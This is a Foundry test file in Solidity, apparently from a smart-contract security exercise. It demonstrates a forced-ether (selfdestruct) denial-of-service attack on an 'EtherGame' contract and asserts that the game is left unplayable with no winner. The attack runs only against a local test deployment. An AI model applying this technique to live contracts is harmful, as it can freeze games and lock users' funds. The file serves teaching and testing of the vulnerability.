// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "../lib/forge-std/src/Test.sol";

import {Attack} from "../src/Attack.sol";
import {EtherGame} from "../src/EtherGame.sol";

contract AttackTester is Test{
    EtherGame etherGame;
    address player1 = makeAddr("player1");
    address player2 = makeAddr("player2");
    address attacker = makeAddr("attacker");

    function setUp() external{
        etherGame = new EtherGame();
        vm.deal(player1, 7 ether);
        vm.deal(player2, 7 ether);
        vm.deal(attacker, 7 ether);
    }

    function testDoesTheGameWorkAsExpected() public {
        // player1 & player2 deposits
        _fundEtherGame(player1); // #1
        _fundEtherGame(player2); // #2
        _fundEtherGame(player1); // #3
        _fundEtherGame(player2); // #4
        _fundEtherGame(player1); // #5
        _fundEtherGame(player2); // #6
        _fundEtherGame(player1); // #7

        assertEq(etherGame.winner(), player1); // since he is the 7th player
    }

    function _fundEtherGame(address playerAddr) private {
        vm.prank(playerAddr);
        etherGame.deposit{value: 1 ether}();
    }

    function testCanAttackerCrashTheGame() public {
        _fundEtherGame(player1); // #1
        _fundEtherGame(player2); // #2

        // now Attacker deploys Attack-Contract & attack the contract through it
        Attack attackContract = new Attack(address(etherGame));
        vm.prank(attacker);
        (bool success, ) = payable(address(attackContract)).call{value: 5 ether}("");
        require(success, "Eth transfer to attack-contract failed");
        vm.prank(attacker);
        attackContract.attack(); // since the contract has 5 ether, so the ethergame's balance will be 7 ether == 5 ether (forced through selfdestruct of attackContract) + 2 ether (funded by players #1 & #2). The game will be crashed & the winner will be address(0) the default value of empty address variable

        assertEq(etherGame.winner(), address(0));
        
        vm.expectRevert();
        _fundEtherGame(player1); // he can't play the game since the game is already crashed (balance is equal to 7 ether)


        assertEq(address(etherGame).balance, 7 ether);
    }

}